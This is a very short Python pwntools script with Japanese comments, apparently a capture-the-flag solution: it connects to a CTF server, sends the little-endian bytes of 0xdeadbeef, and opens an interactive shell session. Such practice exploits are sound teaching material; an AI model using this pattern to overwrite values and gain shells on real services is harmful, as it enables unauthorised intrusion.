from pwn import *    #pwntoolsをインポート 

target = remote("pwn.katagaitai-ctf.com", 9011)    # ターゲットサーバへ接続

target.sendline(p32(0xdeadbeef))    #0xdeadbeefをバイト列"\xef\xbe\xad\xde"に変換してターゲットサーバへ送信
target.interactive()  